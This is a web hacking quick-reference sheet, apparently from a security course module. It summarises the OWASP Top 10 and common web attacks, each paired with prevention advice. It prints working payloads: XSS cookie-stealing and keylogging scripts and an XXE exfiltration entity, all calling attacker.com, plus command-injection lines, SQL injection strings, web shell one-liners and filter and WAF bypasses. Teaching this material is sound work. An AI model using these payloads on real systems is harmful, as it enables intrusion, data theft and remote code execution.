# Module 8: Web Hacking - Quick Reference

## OWASP Top 10 (2021)
1. **Broken Access Control** - IDOR, privilege escalation
2. **Cryptographic Failures** - Weak encryption, exposed data
3. **Injection** - SQL, NoSQL, OS, LDAP injection
4. **Insecure Design** - Missing security controls
5. **Security Misconfiguration** - Default creds, directory listing
6. **Vulnerable Components** - Known-vulnerable libraries
7. **Auth Failures** - Weak auth, session flaws
8. **Integrity Failures** - Unsigned updates, CI/CD attacks
9. **Logging & Monitoring Failures** - Poor incident detection
10. **SSRF** - Server-side request forgery

## SQL Injection (SQLi)
- **Cause**: Unsanitized user input in SQL queries
- **Types**: In-band (error-based, UNION), Blind (boolean-based, time-based), Out-of-band (DNS/HTTP)
- **Detection**: `'`, `"`, `' OR 1=1--`, `' AND 1=2--`
- **UNION injection**: Need to match number of columns (`ORDER BY 1--`, `ORDER BY 2--` etc.)
- **SQLite**: `sqlite_master` table (type, name, sql)
- **MySQL**: `information_schema.tables`, `information_schema.columns`
- **PostgreSQL**: `information_schema.tables`, `pg_class`
- **MSSQL**: `sysobjects`, `syscolumns`
- **Blind**: `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--`
- **Time-based**: `' OR IF(1=1,SLEEP(5),0)--` (MySQL)
- **Prevention**: Parameterized queries/prepared statements, stored procedures, input validation, least privilege

## Cross-Site Scripting (XSS)
- **Stored**: Script saved on server (comments, profiles) - highest impact
- **Reflected**: Script in URL/request, reflected in response (phishing)
- **DOM-based**: Client-side JS vulnerability, server not involved
- **Common payloads**: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<body onload=alert(1)>`, `<input onfocus=alert(1) autofocus>`, `javascript:alert(1)` (in href)
- **Stealing cookies**: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`
- **Keylogging**: `<script>document.onkeypress=function(e){fetch('http://attacker.com/k?k='+e.key)}</script>`
- **Prevention**: Output encoding, CSP headers (Content-Security-Policy), HttpOnly cookies, input validation
- **CSP bypass**: If `script-src` includes `'unsafe-inline'` or CDN with JSONP endpoints or Angular sandbox escape

## Cross-Site Request Forgery (CSRF)
- **Attack**: Authenticated user makes unintended request via malicious page
- **Example**: `<img src="http://bank.com/transfer?amount=1000&to=attacker">`
- **Prevention**:
  - CSRF tokens (sent with forms, validated server-side)
  - SameSite cookies (Lax/Strict)
  - Custom headers (X-Requested-With)
  - Origin/Referer header validation
  - Re-authentication for sensitive actions
  - CAPTCHA

## Authentication Attacks
- **Brute Force**: Try many passwords (slow, detectable)
- **Credential Stuffing**: Use breached credentials from other sites
- **Password Spraying**: Try common passwords across many accounts
- **User Enumeration**: Error messages reveal valid usernames
- **Password Reset Flaws**: Predictable tokens, token sent in URL
- **MFA Bypass**: MFA fatigue (spam push notifications), session manipulation
- **JWT Attacks**: Algorithm confusion (`alg: none`), weak HMAC secret, token expiration ignored

## IDOR (Insecure Direct Object Reference)
- **Example**: `GET /api/user/1337/profile` → change 1337 to 1338
- **Check**: URL parameters, API endpoints, POST body parameters, file paths
- **Prevention**: Authorization checks per object, UUIDs instead of sequential IDs, indirect references

## SSRF (Server-Side Request Forgery)
- **Attack**: Server makes requests to internal resources
- **Cloud metadata**: `http://169.254.169.254/latest/meta-data/` (AWS)
- **File scheme**: `file:///etc/passwd`
- **Internal scanning**: `http://localhost:8080/admin`
- **Prevention**: Allowlist URLs, block private IP ranges, disable unnecessary URL schemes, validate DNS resolution

## Path Traversal / LFI (Local File Inclusion)
- **Payloads**: `../../../etc/passwd`, `....//....//....//etc/passwd`, `%2e%2e%2f` (URL encoded), `..%252f..%252f` (double encoding)
- **PHP wrappers**: `php://filter/convert.base64-encode/resource=index.php`, `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==`
- **Windows**: `..\..\..\windows\system32\drivers\etc\hosts`
- **Prevention**: Validate path against allowlist, use chroot jail, disable unnecessary PHP wrappers

## Directory Enumeration
- **Tools**: gobuster, dirb, dirbuster, ffuf, wfuzz
- **Wordlists**: `/usr/share/wordlists/dirbuster/`, `/usr/share/wordlists/dirb/`, `/usr/share/seclists/Discovery/`
- **Extensions**: `.php`, `.asp`, `.aspx`, `.jsp`, `.txt`, `.conf`, `.bak`, `.old`, `.xml`, `.json`
- **gobuster**: `gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html`
- **ffuf**: `ffuf -u http://target.com/FUZZ -w wordlist.txt -c -fc 403,404`

## File Upload Vulnerabilities
- **RCE**: Upload PHP/JSP/ASP web shell
- **Bypass extension filtering**: `file.php.jpg`, `file.php.`, `file.php%00.jpg` (null byte), `file.pHp` (case), `file.php5`, `file.phtml`
- **Bypass content-type**: Change `Content-Type: image/jpeg`
- **Bypass magic bytes**: Prepend GIF89a; to PHP code
- **Race Condition**: Upload valid file, exploit before validation
- **Prevention**: Validate content (magic bytes), whitelist extensions, randomize filenames, store outside webroot, disable execute on upload dir

## HTTP Request Smuggling
- **CL.TE**: Front-end uses Content-Length, back-end uses Transfer-Encoding
- **TE.CL**: Front-end uses Transfer-Encoding, back-end uses Content-Length
- **TE.TE**: Malformed Transfer-Encoding headers
- **Impact**: Cache poisoning, session hijacking, WAF bypass
- **Prevention**: HTTP/2, consistent parsing, reject ambiguous requests

## XXE (XML External Entity)
- **Basic**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- **Blind OOB**: `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?f=%file;'>">%eval;%exfil;`
- **Billion Laughs** (DoS): Nested entities expanding exponentially
- **SSRF via XXE**: `<!ENTITY xxe SYSTEM "http://internal-server/">`
- **Prevention**: Disable DOCTYPE, disable external entities in XML parser

## Command Injection
- **Separators**: `;`, `&&`, `||`, `|`, `\n` (newline)
- **Linux**: `command; id`, `` command `id` ``, `command $(id)`
- **Windows**: `command & whoami`, `command | whoami`
- **Blind**: `command; ping -c 10 attacker.com` (time-based), `command; curl http://attacker.com/` (OOB)
- **Prevention**: Avoid shell execution, use parameterized APIs, input validation (whitelist), escape special chars

## Web Shells
- **PHP**: `<?php system($_GET['cmd']); ?>`
- **ASP**: `<% Execute("cmd=" & request("cmd")) %>`
- **JSP**: `Runtime.getRuntime().exec(request.getParameter("cmd"));`
- **Tools**: Weevely, b374k, P0wny shell, C99, AntSword, Godzilla, Behinder

## Web Application Firewalls (WAF)
- **Evasion techniques**: Case switching (`SeLeCt`), comments (`SE/**/LECT`), URL encoding, double encoding, parameter pollution, chunked transfer encoding, unicode encoding
- **Detection**: Modify one parameter at a time, test simple payloads first, note blocked patterns

## Tools
- **Burp Suite**: Proxy, Repeater, Intruder, Scanner, Decoder, Comparer, Extender
  - Proxy intercepts HTTP/S traffic
  - Repeater sends modified requests
  - Intruder automates parameter fuzzing
- **OWASP ZAP**: Open-source web scanner with similar capabilities
- **Nuclei**: Template-based vulnerability scanner (YAML templates)
- **Nikto**: Web server scanner (finding outdated versions, default files)
- **sqlmap**: Automated SQL injection detection/exploitation
- **FFUF/Gobuster**: Directory and file enumeration
- **Hydra/Medusa**: Online password brute-force
- **John/Hashcat**: Offline hash cracking
